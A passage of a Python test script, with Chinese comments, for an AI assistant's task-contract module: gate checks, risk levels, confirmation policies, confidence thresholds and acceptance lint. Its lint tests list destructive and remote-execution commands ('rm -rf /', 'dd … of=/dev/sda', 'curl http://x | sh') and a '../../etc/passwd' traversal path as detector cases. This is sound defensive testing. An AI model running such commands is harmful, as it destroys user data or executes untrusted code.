# -*- coding: utf-8 -*-
"""契约 v2（规范 §0–§3.7）独立测试（离线，无需 API Key / 不读库 / 不发网络）。

    $env:PYTHONIOENCODING="utf-8"
    & "D:/project/neurosama/.venv/Scripts/python.exe" scripts/test_contract.py

覆盖范围（规范：小汐 × 像素工坊：契约、状态机与事件协议 v2 规范.md §0–§3.7；
边界：docs/CONTRACT_V2_SCOPE.md）：

  A  G1–G6 字段约束：每条正例 + 反例，且断言 gap.check 是预期编号
  B  追问策略（§3.3）：每轮 1 问 / 按影响排序 / 上限 3 轮 / 保守填充 / 降级不自动开工
  C  风险规则表（§3.4）：8 行逐行 + 不可逆兜底 + 空副作用 + 取最高值
  D  按风险的确认策略（§3.4 表二）：low 自动开工+倒计时 / medium 显式 / high 逐项点头
  E  置信度使用规则（§3.5）：四档 + 副作用槽位任意置信度要确认 + 阈值倒挂抛异常 + 冲突记忆
  F  lint L1–L7（§3.7）：每条反例且断言 problem.rule 是预期编号
  G  内置 CsvRule 六条：每条正反例（changed_rows_column_is_today 三种情形）
  H  §3.6 完整示例（竞品表格）：freeze 成功 / risk=medium / deliver_to 高亮
  I  边界断言：无业务 import / 无 TaskEngine·Verifier·EventBus / 权限不校验等级 /
     exit_code_zero 的 cmd 不执行
  J  parse_contract 形状校验 + risk 重算覆盖（不允许手填降级）

写测试的人 ≠ 写实现的人：本文件只读 server/contract 的公开行为，
不 mock、不 patch 实现内部，发现不符合规范的地方记为缺陷（见报告）。
"""
from __future__ import annotations

import ast
import json
import os
import shutil
import sys
import tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

from server.contract import (  # noqa: E402
    Draft, GateOutcome, Gap, SilentFillPolicy, SideEffect, Slot, SlotSource, TaskContract,
    compute_risk, confirmation_policy, evaluate, freeze, gate, highlighted_slots,
    lint_acceptance, parse_contract, resolve_conflicting_memories, risk_of_side_effect,
)
from server.contract.csv_rules import RULES, apply_rule, read_rows, read_rows_from_bytes  # noqa: E402
from server.contract.gate import effective_start_policy  # noqa: E402
from server.contract.model import (  # noqa: E402
    ArtifactSpec, Budget, CheckSpec, ContractShapeError, Criterion, CsvRule, InputRef,
    RiskAssessment,
)
from server.contract.risk import (  # noqa: E402
    AUTO_START, EXPLICIT_CONFIRM, EXPLICIT_CONFIRM_WITH_SLOT_ACK,
)

passed, failed = 0, []


def check(name: str, condition: bool, detail: str = "") -> None:
    global passed
    if condition:
        passed += 1
        print(f"  ok   {name}")
    else:
        failed.append(f"{name}{'  ' + detail if detail else ''}")
        print(f"  FAIL {name}  {detail}")


# ---------- 构造助手 ----------

def _slot(value, *, kind="default", turn_id="", memory_id="", confidence=None,
          reason="默认", confirmed=False, highlight=False, where="x", problems=None):
    """按规范形状构造 Slot。"""
    problems = [] if problems is None else problems
    source = {"kind": kind}
    if turn_id:
        source["turn_id"] = turn_id
    if memory_id:
        source["memory_id"] = memory_id
    if confidence is not None:
        source["confidence"] = confidence
    if reason and kind == "default":
        source["reason"] = reason
    data = {"value": value, "source": source, "confirmed": confirmed}
    if highlight:
        data["highlight"] = True
    return Slot.from_mapping(data, where=where, problems=problems)


def mk_goal(text="更新竞品对比表的最新数据"):
    return _slot(text, kind="user_utterance", turn_id="t_88")


def mk_artifact(kind="csv", fmt="csv", location="out/竞品对比.csv"):
    return _slot(ArtifactSpec(kind=kind, format=fmt, location=location),
                 kind="memory", memory_id="m_0142", confidence=0.91)


def mk_criterion(cid="C1", kind="deterministic", check=None, required=True, text=None):
    problems = []
    if check is None:
        check = {"type": "file_exists_nonempty", "path": "out/竞品对比.csv", "min_bytes": 100}
    parsed = Criterion.parse(
        {"id": cid, "text": text or "输出文件存在且不为空", "kind": kind,
         "check": check, "required": required},
        where=f"acceptance.{cid}", problems=problems)
    assert parsed is not None, problems
    return parsed


def mk_effect(effect_id="se_1", type_="send_message", target="secret_ref:webhook/self",
              target_class="self", reversible=False, has_backup=False,
              idempotency_key="ct_demo_001:se_1"):
    return SideEffect(id=effect_id, type=type_, target=target, target_class=target_class,
                      reversible=reversible, has_backup=has_backup,
                      idempotency_key=idempotency_key)


def mk_draft(**overrides):
    """一个默认全过的草案；用关键字覆盖出各种缺口。"""
    fields = dict(
        contract_id="ct_test_001", version=1, created_at="2026-10-21T00:00:00Z",
        utterance="小汐，把昨天那个竞品表格更新一下发我",
        goal=mk_goal(), inputs=(), artifact=mk_artifact(), deliver_to=None,
        acceptance=(mk_criterion(),), side_effects=(),
        permissions_required=("L1", "L4"), budget=Budget(),
    )
    fields.update(overrides)
    return Draft(**fields)


def gaps_of(draft):
    from server.contract import collect_gaps
    return collect_gaps(draft)


def gap_checks(draft):
    return [gap.check for gap in gaps_of(draft)]


def rule_names(criteria):
    return lint_acceptance(criteria).rules()


# ---------- A. G1–G6 ----------

def test_a_gates():
    print("[A G1–G6 字段约束·正反例]")
    # G1 目标清晰
    check("G1 通过·正常目标", "G1" not in gap_checks(mk_draft()))
    check("G1 拦下·goal 缺失", gap_checks(mk_draft(goal=None)) == ["G1"])
    check("G1 拦下·goal 空串", gap_checks(mk_draft(goal=_slot(""))) == ["G1"])
    check("G1 拦下·目标 81 字", gap_checks(mk_draft(goal=mk_goal("把" * 81))) == ["G1"])
    check("G1 拦下·目标 1 字", gap_checks(mk_draft(goal=mk_goal("做"))) == ["G1"])
    check("G1 边界·目标 80 字通过", "G1" not in gap_checks(mk_draft(goal=mk_goal("把" * 80))))
    check("G1 边界·目标 2 字通过", "G1" not in gap_checks(mk_draft(goal=mk_goal("做事"))))

    # G2 输入可解析
    exists = _slot(InputRef(type="file", uri="~/work/x.csv", exists=True),
                   kind="memory", memory_id="m_1", confidence=0.9)
    text_input = _slot(InputRef(type="text", uri="内联文本"),
                       kind="user_utterance", turn_id="t_1")
    unknown = _slot(InputRef(type="file", uri="~/work/y.csv", exists=None),
                    kind="default", reason="推断")
    missing = _slot(InputRef(type="file", uri="~/work/z.csv", exists=False),
                    kind="default", reason="推断")
    check("G2 通过·exists=True", "G2" not in gap_checks(mk_draft(inputs=(exists,))))
    check("G2 通过·text 类型不查存在", "G2" not in gap_checks(mk_draft(inputs=(text_input,))))
    check("G2 通过·无输入任务允许空", "G2" not in gap_checks(mk_draft(inputs=())))
    check("G2 拦下·exists=None 未探测", gap_checks(mk_draft(inputs=(unknown,))) == ["G2"])
    check("G2 拦下·exists=False 不存在", gap_checks(mk_draft(inputs=(missing,))) == ["G2"])
    check("G2 拦下·输入形状不对",
          gap_checks(mk_draft(inputs=(_slot("裸字符串"),))) == ["G2"])

    # G3 交付物明确
    check("G3 通过·csv 类", "G3" not in gap_checks(mk_draft(artifact=mk_artifact())))
    file_with_fmt = _slot(ArtifactSpec(kind="file", format="md"), kind="default", reason="默认")
    check("G3 通过·file 类带 format", "G3" not in gap_checks(mk_draft(artifact=file_with_fmt)))
    check("G3 拦下·artifact 缺失", gap_checks(mk_draft(artifact=None)) == ["G3"])
    file_no_fmt = _slot(ArtifactSpec(kind="file", format=""), kind="default", reason="默认")
    check("G3 拦下·file 类缺 format", gap_checks(mk_draft(artifact=file_no_fmt)) == ["G3"])
    bad_kind = _slot(ArtifactSpec(kind="other"), kind="default", reason="默认")
    check("G3 通过·other 是合法 kind", "G3" not in gap_checks(mk_draft(artifact=bad_kind)))
    raw_dict_artifact = _slot({"kind": "weird", "format": ""}, kind="default", reason="默认")
    check("G3 拦下·kind 不在枚举内",
          gap_checks(mk_draft(artifact=raw_dict_artifact)) == ["G3"])

    # G4 验收标准可验
    check("G4 通过·1 条 required deterministic", "G4" not in gap_checks(mk_draft()))
    check("G4 拦下·acceptance 为空", gap_checks(mk_draft(acceptance=())) == ["G4"])
    bad_acceptance = (mk_criterion(cid="C1", kind="semantic",
                                   check={"type": "rubric", "rubric": [], "evidence_required": True}),)
    check("G4 拦下·标准过不了 lint", gap_checks(mk_draft(acceptance=bad_acceptance)) == ["G4"])

    # G5 风险与副作用
    check("G5 通过·空副作用（只读）", "G5" not in gap_checks(mk_draft()))
    check("G5 通过·合法副作用",
          "G5" not in gap_checks(mk_draft(side_effects=(mk_effect(),))))
    check("G5 拦下·裸 dict 副作用",
          gap_checks(mk_draft(side_effects=({"id": "se_1", "type": "send_message"},))) == ["G5"])
    no_key = mk_effect(idempotency_key="")
    check("G5 拦下·缺 idempotency_key",
          gap_checks(mk_draft(side_effects=(no_key,))) == ["G5"])
    deliver = _slot("secret_ref:webhook/self", kind="memory", memory_id="m_0177", confidence=0.88)
    check("G5 拦下·deliver_to 但没声明发送副作用",
          gap_checks(mk_draft(deliver_to=deliver)) == ["G5"])
    check("G5 通过·deliver_to 且有 send_message",
          "G5" not in gap_checks(mk_draft(deliver_to=deliver, side_effects=(mk_effect(),))))

    # G6 预算与权限
    check("G6 通过·budget+权限齐", "G6" not in gap_checks(mk_draft()))
    check("G6 拦下·budget 缺失", gap_checks(mk_draft(budget=None)) == ["G6"])
    check("G6 拦下·权限为空", gap_checks(mk_draft(permissions_required=())) == ["G6"])
    check("G6 拦下·权限含空串",
          gap_checks(mk_draft(permissions_required=("L1", ""))) == ["G6"])
    check("G6 拦下·权限含非字符串",
          gap_checks(mk_draft(permissions_required=("L1", 3))) == ["G6"])
    # §6.2（L0–L6）取代了缺失的 §7.1，规范 L954 原话：「permissions_required 的取值域
    # 就在这张表。G6 从『非空字符串』升级为『必须在本表内』。」原「冻结项：不校验等级
    # 合法性」的前提已不成立，改为双向断言。
    # 注：shape 层（parse_contract）是否也要同步校验等级，架构尚未裁定（issue 503），
    # 这里只动 gate 层；shape 层那处断言保持原样，等裁定后单独一次提交。
    # 七级逐个显式列，不用循环：合法集是闭集，少认一级 G6 就漏一级，
    # 而循环写在元组里删掉一项是静默的（测试照跑，覆盖少一级无人知道）。
    # 写成七条独立断言，删掉任何一条都是源码里可见的改动。
    check("G6 合法等级 L0 不产生 gap",
          "G6" not in gap_checks(mk_draft(permissions_required=("L0",))))
    check("G6 合法等级 L1 不产生 gap",
          "G6" not in gap_checks(mk_draft(permissions_required=("L1",))))
    check("G6 合法等级 L2 不产生 gap",
          "G6" not in gap_checks(mk_draft(permissions_required=("L2",))))
    check("G6 合法等级 L3 不产生 gap",
          "G6" not in gap_checks(mk_draft(permissions_required=("L3",))))
    check("G6 合法等级 L4 不产生 gap",
          "G6" not in gap_checks(mk_draft(permissions_required=("L4",))))
    check("G6 合法等级 L5 不产生 gap",
          "G6" not in gap_checks(mk_draft(permissions_required=("L5",))))
    check("G6 合法等级 L6 不产生 gap",
          "G6" not in gap_checks(mk_draft(permissions_required=("L6",))))
    # 非法值是开集（任何不在 L0–L6 里的串），抽样即可，用循环不掩盖缺口。
    for bad in ("NONSENSE_LEVEL", "L7", "l1", "", "L", "L10"):
        check(f"G6 非法等级 {bad!r} 被拦下",
              gap_checks(mk_draft(permissions_required=("L1", bad))) == ["G6"],
              str(gap_checks(mk_draft(permissions_required=("L1", bad)))))

    # 每轮只问 1 个：collect_gaps 给全量，evaluate 只暴露第一个
    multi = mk_draft(goal=None, artifact=None, budget=None)
    gaps = gaps_of(multi)
    check("多缺口时 collect_gaps 返回全量", len(gaps) >= 3, str(len(gaps)))
    outcome = evaluate(multi, round_index=0)
    check("needs_clarification 只带 1 个 gap", outcome.gap is not None
          and outcome.gap == gaps[0])
    check("gap 是按影响排序后的第一个", outcome.gap.check == "G3")


# ---------- B. 追问策略 ----------

def test_b_clarification():
    print("[B 追问策略·§3.3]")
    # 按影响排序：副作用槽位 > 输入源 > 交付物 > 验收标准 > 其他
    all_broken = mk_draft(
        goal=None,
        inputs=(_slot(InputRef(type="file", uri="x.csv", exists=None),
                      kind="default", reason="r"),),
        artifact=None, acceptance=(),
        side_effects=({"id": "se_1", "type": "send_message"},),
        budget=None, permissions_required=(),
    )
    gaps = gaps_of(all_broken)
    check("排序·副作用槽位排最前", gaps[0].check == "G5" and gaps[0].key == "side_effect",
          str([(g.check, g.key) for g in gaps]))

    no_side = mk_draft(
        goal=None,
        inputs=(_slot(InputRef(type="file", uri="x.csv", exists=None),
                      kind="default", reason="r"),),
        artifact=None, acceptance=(), budget=None, permissions_required=(),
    )
    check("排序·无副作用缺口时输入源排最前", gaps_of(no_side)[0].check == "G2")

    no_input = mk_draft(goal=None, inputs=(), artifact=None, acceptance=(),
                        budget=None, permissions_required=())
    check("排序·再退是交付物", gaps_of(no_input)[0].check == "G3")

    no_artifact = mk_draft(goal=None, artifact=mk_artifact(), acceptance=(),
                           budget=None, permissions_required=())
    check("排序·再退是验收标准", gaps_of(no_artifact)[0].check == "G4")

    no_acceptance = mk_draft(goal=None, artifact=mk_artifact(),
                             acceptance=(mk_criterion(),), budget=None,
                             permissions_required=())
    check("排序·再退是其他（goal/budget/permission）",
          gaps_of(no_acceptance)[0].key in ("goal", "budget", "permission"))

    # 轮数上限 3
    for round_index in (0, 1, 2):
        outcome = evaluate(no_artifact, round_index=round_index)
        check(f"第 {round_index} 轮仍追问", outcome.status == "needs_clarification",
              outcome.status)
    outcome3 = evaluate(no_artifact, round_index=3)
    check("第 3 轮起不再追问", outcome3.status != "needs_clarification", outcome3.status)

    # 保守填充：只缺 budget（形式缺口）→ 填充后 ready + 降级标记
    only_budget = mk_draft(budget=None)
    degraded = evaluate(only_budget, round_index=3)
    check("保守填充·只缺预算时第 3 轮可 ready", degraded.status == "ready", degraded.status)
    check("保守填充·降级任务必须显式确认",
          degraded.degraded_requires_explicit_confirmation is True)
    check("保守填充·ready 时契约已冻结", degraded.contract is not None)
    check("保守填充·填充后预算有值",
          degraded.contract is not None and degraded.contract.budget.max_wall_s > 0)

    # 保守填充不改事实：exists=False 的输入第 3 轮不能洗成合格
    bad_input = mk_draft(inputs=(_slot(InputRef(type="file", uri="x.csv", exists=False),
                                       kind="default", reason="r"),))
    rejected = evaluate(bad_input, round_index=3)
    check("保守填充不改事实·exists=False 第 3 轮仍拒绝",
          rejected.status == "rejected", rejected.status)

    # 保守填充不改事实：9 条 required（超 L6）第 3 轮不能洗成合格
    nine = tuple(mk_criterion(cid=f"C{i}", required=True) for i in range(9))
    over_l6 = mk_draft(acceptance=nine)
    check("L6·9 条 required 被 lint 拦下", "L6" in rule_names(nine))
    check("保守填充不改事实·超 L6 第 3 轮仍拒绝",
          evaluate(over_l6, round_index=3).status == "rejected")

    # 保守填充不改事实：81 字目标第 3 轮不能洗成合格
    long_goal = mk_draft(goal=mk_goal("把" * 81))
    check("保守填充不改事实·81 字目标第 3 轮仍拒绝",
          evaluate(long_goal, round_index=3).status == "rejected")

    # 填充后的高亮：有缺口的槽位一律高亮
    check("保守填充·ready 时高亮槽位非空",
          len(degraded.high_lighted_slots) > 0, str(degraded.high_lighted_slots))

    # gate 别名与 evaluate 等价
    check("gate 与 evaluate 行为一致",
          gate(only_budget, round_index=0).status == evaluate(only_budget, round_index=0).status)

    # §2.2 接口：rejected 必须带 reason（unverifiable_criteria/unsafe/out_of_scope）
    outcome = evaluate(mk_draft(goal=None), round_index=3)
    check("§2.2·rejected 分支带 reason 字段",
          outcome.status == "rejected" and hasattr(outcome, "reason")
          and getattr(outcome, "reason", "") in ("unverifiable_criteria", "unsafe", "out_of_scope"),
          f"status={outcome.status} reason={getattr(outcome, 'reason', '<无字段>')!r}")
    # reason 只出现在 rejected 分支，其它分支必须是空串
    ready_out = evaluate(mk_draft(), round_index=0)
    check("§2.2·ready 分支 reason 为空串", ready_out.reason == "")
    ask_out = evaluate(mk_draft(goal=None), round_index=0)
    check("§2.2·needs_clarification 分支 reason 为空串", ask_out.reason == "")
    # 两条 rejected 出口（remaining gaps 与 freeze 抛错）都要填 reason
    from server.contract.gate import REJECT_REASONS
    check("§2.2·REJECT_REASONS 恰好三个取值", REJECT_REASONS == (
        "unverifiable_criteria", "unsafe", "out_of_scope"), str(REJECT_REASONS))
    freeze_fail = Draft(contract_id="ct_x", version=1, created_at="t", utterance="",
                        goal=mk_goal(), artifact=mk_artifact(), acceptance=(mk_criterion(),),
                        budget=None, permissions_required=("L1",))
    check("§2.2·freeze 抛错那条 rejected 出口也带 reason",
          evaluate(freeze_fail, round_index=3).reason == "unverifiable_criteria")

    # §3.3 兜底：降级任务不得走倒计时自动开工
    policy = effective_start_policy(degraded)
    check("§3.3 兜底·降级任务 start 为显式确认",
          policy["start"] == EXPLICIT_CONFIRM, policy["start"])
    check("§3.3 兜底·降级任务不允许倒计时", policy["countdown_allowed"] is False)
    # 正常 low 风险任务仍然可以自动开工
    normal = evaluate(mk_draft(), round_index=0)
    normal_policy = effective_start_policy(normal)
    check("正常 low 风险可自动开工", normal_policy["start"] == AUTO_START)
    check("正常 low 风险允许倒计时", normal_policy["countdown_allowed"] is True)
    check("正常 low 风险倒计时默认 5 秒（语音）",
          normal_policy["countdown_default_s"] == 5.0)
    non_voice = effective_start_policy(normal, voice_mode=False)
    check("非语音 low 风险倒计时默认 3 秒", non_voice["countdown_default_s"] == 3.0)


# ---------- C. 风险规则表 ----------

def test_c_risk():
    print("[C 风险规则表·§3.4]")
    # 空副作用 = 只读 = low
    empty = compute_risk(())
    check("空副作用=low", empty.level == "low", empty.level)
    check("空副作用有理由说明", len(empty.reasons) >= 1)

    # 8 行逐行
    rows = [
        ("overwrite_file 有备份=medium",
         mk_effect(type_="overwrite_file", has_backup=True, reversible=True), "medium"),
        ("overwrite_file 无备份=high",
         mk_effect(type_="overwrite_file", has_backup=False, reversible=True), "high"),
        ("write_outside_workspace=medium",
         mk_effect(type_="write_outside_workspace", target_class="local", reversible=True), "medium"),
        ("send_message 给自己=medium",
         mk_effect(type_="send_message", target_class="self", reversible=True), "medium"),
        ("send_message 给第三方=high",
         mk_effect(type_="send_message", target_class="third_party", reversible=True), "high"),
        ("http_write 给自己=medium",
         mk_effect(type_="http_write", target_class="self", reversible=True), "medium"),
        ("http_write 给第三方=high",
         mk_effect(type_="http_write", target_class="third_party", reversible=True), "high"),
        ("delete=high", mk_effect(type_="delete", target_class="local", reversible=True), "high"),
        ("spend_money=high", mk_effect(type_="spend_money", target_class="local", reversible=True), "high"),
        ("install=high", mk_effect(type_="install", target_class="local", reversible=True), "high"),
    ]
    for name, effect, expected in rows:
        level, reason = risk_of_side_effect(effect)
        check(name, level == expected and bool(reason), f"实际 {level} {reason!r}")

    # 兜底：reversible=False 的只读副作用至少 medium
    readonly_irreversible = mk_effect(type_="other", target_class="local", reversible=False)
    level, reason = risk_of_side_effect(readonly_irreversible)
    check("兜底·不可逆只读副作用=medium", level == "medium", level)
    reversible_readonly = mk_effect(type_="other", target_class="local", reversible=True)
    level, _ = risk_of_side_effect(reversible_readonly)
    check("可逆只读副作用=low", level == "low", level)
    # 兜底不能把 high 降下来
    level, _ = risk_of_side_effect(
        mk_effect(type_="delete", target_class="local", reversible=False))
    check("兜底不降级·delete 仍=high", level == "high", level)

    # 取所有副作用里的最高值
    mixed = compute_risk((mk_effect(type_="send_message", target_class="self"),
                          mk_effect(type_="delete")))
    check("取最高值·[medium, high]=high", mixed.level == "high", mixed.level)
    mixed2 = compute_risk((mk_effect(type_="send_message", target_class="self"),
                           mk_effect(type_="other", target_class="local")))
    check("取最高值·[medium, low]=medium", mixed2.level == "medium", mixed2.level)
    check("汇总·每条副作用都有理由", len(mixed.reasons) == 2)

    # §6.2 跨字段硬断言（3b，2026-10-24 接入）：「permissions_required 里的最高等级，
    # 本身就是 risk 的下界——L5/L6 出现在契约里，risk 不得低于 high。
    # 这条是硬断言，不是建议：风险规则算漏了，权限表兜住。」
    r = compute_risk((), permissions_required=("L6",))
    check("3b·L6 无副作用也从 low 抬到 high", r.level == "high", r.level)
    check("3b·理由点名 §6.2 下界", any("§6.2" in item for item in r.reasons), str(r.reasons))
    r = compute_risk((), permissions_required=("L5",))
    check("3b·L5 同样抬到 high", r.level == "high", r.level)
    r = compute_risk((), permissions_required=("L0", "L4"))
    check("3b·L4 及以下不抬（规范只操作化了 L5/L6）", r.level == "low", r.level)
    # 下界只兜不降：副作用已算出的 high 不因权限低而拉下来
    r = compute_risk((mk_effect(type_="delete"),), permissions_required=("L0",))
    check("3b·下界不降级（delete 仍 high）", r.level == "high", r.level)
    # medium 副作用 + L6 → 抬到 high
    r = compute_risk((mk_effect(type_="send_message", target_class="self", reversible=True),),
                     permissions_required=("L6",))
    check("3b·medium 副作用遇 L6 抬到 high", r.level == "high", r.level)
    # 多等级取最高
    r = compute_risk((), permissions_required=("L0", "L6"))
    check("3b·多等级取最高（L0+L6 → high）", r.level == "high", r.level)
    # 等级名合法性归 G6；这里对乱码不抬也不炸
    r = compute_risk((), permissions_required=("NONSENSE",))
    check("3b·乱码等级不炸不抬（合法性归 G6）", r.level == "low", r.level)
    # 不传权限保持既有行为（向后兼容：旧调用点等于不启用兜底）
    r = compute_risk(())
    check("3b·不传 permissions_required 时行为不变（low）", r.level == "low", r.level)

    # 冻结路径（gate.freeze → parse_contract）：「L6 权限配低风险的委托」进不了契约。
    # 规范 §6.2 给的验证手法就是这个：构造 L6 + 想要 low 的契约，看它能否被冻进去。
    frozen = freeze(mk_draft(permissions_required=("L6",), side_effects=()))
    check("3b·freeze 后 L6 无副作用的契约 risk=high（L6+low 组合被拒绝）",
          frozen.risk.level == "high", frozen.risk.level)
    check("3b·freeze 的理由里有 §6.2 下界说明",
          any("§6.2" in item for item in frozen.risk.reasons), str(frozen.risk.reasons))


# ---------- D. 确认策略 ----------

def test_d_confirmation():
    print("[D 按风险的确认策略·§3.4 表二]")
    low = confirmation_policy("low")
    check("low·可自动开工", low["start"] == AUTO_START)
    check("low·允许倒计时", low["countdown_allowed"] is True)
    check("low·交付前不需要确认", low["delivery_confirmation"] == "not_required")
    check("low·不需要逐项点头", low["acknowledge_each_highlighted_slot"] is False)

    low_highlight = confirmation_policy("low", has_highlighted_slot=True)
    check("low·有高亮槽位时不允许倒计时",
          low_highlight["countdown_allowed"] is False)
    check("low·有高亮槽位时倒计时值为 None",
          low_highlight["countdown_default_s"] is None)
    check("low·有高亮槽位仍可自动开工", low_highlight["start"] == AUTO_START)

    medium = confirmation_policy("medium")
    check("medium·必须显式确认", medium["start"] == EXPLICIT_CONFIRM)
    check("medium·不允许倒计时", medium["countdown_allowed"] is False)
    check("medium·交付前需要确认并展示动作与预览",
          medium["delivery_confirmation"] == "required_show_actions_and_preview")

    high = confirmation_policy("high", has_highlighted_slot=True)
    check("high·显式确认并对高亮槽位逐项点头",
          high["start"] == EXPLICIT_CONFIRM_WITH_SLOT_ACK)
    check("high·acknowledge_each_highlighted_slot=True",
          high["acknowledge_each_highlighted_slot"] is True)
    check("high·不允许倒计时", high["countdown_allowed"] is False)
    check("high·交付前必须再次展示目的地与摘要",
          high["delivery_confirmation"] == "required_show_destination_and_summary")
    high_no_highlight = confirmation_policy("high")
    check("high·无高亮槽位时无槽可点",
          high_no_highlight["acknowledge_each_highlighted_slot"] is False)
    check("high·无高亮槽位仍必须显式确认",
          high_no_highlight["start"] == EXPLICIT_CONFIRM_WITH_SLOT_ACK)

    try:
        confirmation_policy("critical")
        check("未知风险等级抛异常", False, "未抛")
    except ValueError:
        check("未知风险等级抛异常", True)


# ---------- E. 置信度 ----------

def test_e_confidence():
    print("[E 置信度使用规则·§3.5]")
    policy = SilentFillPolicy()
    check("c=0.90 静默补全", policy.decide(0.90, is_side_effect_slot=False) == "silent")
    check("c=0.85 边界静默", policy.decide(0.85, is_side_effect_slot=False) == "silent")
    check("c=0.84 确认档", policy.decide(0.84, is_side_effect_slot=False) == "confirm")
    check("c=0.70 边界确认", policy.decide(0.70, is_side_effect_slot=False) == "confirm")
    check("c=0.69 追问档", policy.decide(0.69, is_side_effect_slot=False) == "ask")
    check("c=0.10 追问档", policy.decide(0.10, is_side_effect_slot=False) == "ask")
    check("副作用槽位 c=0.99 也要确认",
          policy.decide(0.99, is_side_effect_slot=True) == "confirm")
    check("副作用槽位 c=0.10 也要确认（不是追问，是高亮展示）",
          policy.decide(0.10, is_side_effect_slot=True) == "confirm")
    check("无置信度（纯用户话语）静默", policy.decide(None, is_side_effect_slot=False) == "silent")
    check("needs_highlight·静默档不高亮",
          policy.needs_highlight(0.9, is_side_effect_slot=False) is False)
    check("needs_highlight·确认档高亮",
          policy.needs_highlight(0.75, is_side_effect_slot=False) is True)
    check("needs_highlight·追问档高亮",
          policy.needs_highlight(0.5, is_side_effect_slot=False) is True)
    check("needs_highlight·副作用槽位任意置信度高亮",
          policy.needs_highlight(0.99, is_side_effect_slot=True) is True)

    # 阈值倒挂要抛异常
    try:
        SilentFillPolicy(silent_fill_min=0.5, confirm_fill_min=0.8)
        check("阈值倒挂抛异常", False, "未抛")
    except ValueError:
        check("阈值倒挂抛异常", True)
    for bad in (-0.1, 1.1):
        try:
            SilentFillPolicy(silent_fill_min=bad)
            check(f"silent_fill_min={bad} 越界抛异常", False, "未抛")
        except ValueError:
            check(f"silent_fill_min={bad} 越界抛异常", True)

    # 配置读取
    from_config = SilentFillPolicy.from_config(
        {"memory": {"silent_fill_min": 0.9, "confirm_fill_min": 0.6,
                    "side_effect_slots_always_show": True}})
    check("from_config 读取 memory 段", from_config.silent_fill_min == 0.9)
    flat = SilentFillPolicy.from_config({"silent_fill_min": 0.9, "confirm_fill_min": 0.6})
    check("from_config 兼容平铺结构", flat.silent_fill_min == 0.9)
    default = SilentFillPolicy.from_config(None)
    check("from_config 空配置用规范默认值", default.silent_fill_min == 0.85)
    check("from_config·confirm 默认 0.70", default.confirm_fill_min == 0.70)

    # 多条记忆冲突
    candidates = [
        {"memory_id": "m_1", "source_kind": "memory", "confirmed_at": 100.0},
        {"memory_id": "m_2", "source_kind": "user_confirmed", "confirmed_at": 50.0},
        {"memory_id": "m_3", "source_kind": "user_confirmed", "confirmed_at": 90.0},
    ]
    picked = resolve_conflicting_memories(candidates)
    check("冲突记忆·取最近一次 user_confirmed",
          picked is not None and picked["memory_id"] == "m_3", str(picked))
    check("冲突记忆·没有 user_confirmed 时返回 None（转追问）",
          resolve_conflicting_memories(
              [{"memory_id": "m_1", "source_kind": "memory", "confirmed_at": 100.0}]) is None)
    check("冲突记忆·user_confirmed 缺时间戳不可用",
          resolve_conflicting_memories(
              [{"memory_id": "m_1", "source_kind": "user_confirmed"}]) is None)
    check("冲突记忆·空列表返回 None", resolve_conflicting_memories([]) is None)


# ---------- F. lint L1–L7 ----------

def test_f_lint():
    print("[F lint L1–L7·§3.7]")
    # L1 kind 与 check.type 匹配
    l1_cases = [
        ("deterministic 配 rubric", "deterministic",
         {"type": "rubric", "rubric": ["x"], "evidence_required": True}),
        ("semantic 配 csv_assert", "semantic",
         {"type": "csv_assert", "path": "a.csv", "rules": [{"name": "unique_key", "args": {"columns": ["k"]}}]}),
        ("human 配 file_exists_nonempty", "human",
         {"type": "file_exists_nonempty", "path": "a.csv"}),
    ]
    for name, kind, spec in l1_cases:
        problems = []
        criterion = Criterion.parse(
            {"id": "C1", "text": "x", "kind": kind, "check": spec, "required": True},
            where="a", problems=problems)
        assert criterion is not None, problems
        result = lint_acceptance((criterion, mk_criterion(cid="C0")))
        check(f"L1 拦下·{name}", "L1" in result.rules(), str(result.rules()))
    ok_mixed = lint_acceptance((mk_criterion(cid="C1"),))
    check("L1 通过·kind 与 check 匹配", "L1" not in ok_mixed.rules())

    # L2 deterministic 必带可解析的 check
    def lint_one(check, kind="deterministic"):
        problems = []
        criterion = Criterion.parse(
            {"id": "C1", "text": "x", "kind": kind, "check": check, "required": True},
            where="a", problems=problems)
        assert criterion is not None, problems
        return lint_acceptance((criterion, mk_criterion(cid="C0"))).rules()

    check("L2 拦下·file_exists_nonempty 缺 path",
          "L2" in lint_one({"type": "file_exists_nonempty"}))
    check("L2 拦下·schema_valid 缺 schema_ref",
          "L2" in lint_one({"type": "schema_valid", "path": "a.json", "format": "json"}))
    check("L2 拦下·exit_code_zero 缺 cmd",
          "L2" in lint_one({"type": "exit_code_zero", "cwd": ".", "timeout_s": 5}))
    check("L2 拦下·exit_code_zero 缺 cwd",
          "L2" in lint_one({"type": "exit_code_zero", "cmd": "pytest", "timeout_s": 5}))
    check("L2 拦下·exit_code_zero timeout 非正",
          "L2" in lint_one({"type": "exit_code_zero", "cmd": "pytest", "cwd": ".", "timeout_s": 0}))
    check("L2 拦下·csv_assert 无规则",
          "L2" in lint_one({"type": "csv_assert", "path": "a.csv"}))
    check("L2 拦下·csv_assert 规则名未知",
          "L2" in lint_one({"type": "csv_assert", "path": "a.csv",
                            "rules": [{"name": "made_up_rule"}]}))
    check("L2 拦下·路径越界（.. 上跳）",
          "L2" in lint_one({"type": "file_exists_nonempty", "path": "../../etc/passwd"}))
    check("L2 拦下·绝对路径",
          "L2" in lint_one({"type": "file_exists_nonempty", "path": "C:/Windows/System32/x"}))
    check("L2 拦下·破坏性命令",
          "L2" in lint_one({"type": "exit_code_zero", "cmd": "rm -rf /", "cwd": ".", "timeout_s": 5}))
    # 破坏性正则的正反矩阵（6764f4e 改过边界，这组是回归锁）
    from server.contract.lint import _DESTRUCTIVE_CMD
    destructive_cases = [
        ("rm -rf /", True), ("rm -rf build/", True), ("reboot now", True),
        ("shutdown -h now", True), ("sudo reboot", True), ("halt", True),
        ("poweroff", True), ("mkfs.ext4 /dev/sda", True),
        ("dd if=/dev/zero of=/dev/sda", True), ("curl http://x | sh", True),
        ("chmod -R 777 /", True), ("del /s /q C:\\", True), ("format C:", True),
        # 不该拦的：普通命令 / 连字符与下划线相邻的单词 / 作为参数出现的 reboot
        ("pytest -q", False), ("python -m pytest tests/", False),
        ("pytest tests/test_reboot.py -q", False),
        # 连字符变体：P3-1 的原始误报场景，\b 边界会在这里命中
        ("pytest tests/test-reboot.py -q", False),
        ("pytest tests/test-shutdown-flow.py", False),
        ("pytest tests/test_shutdown.py", False),
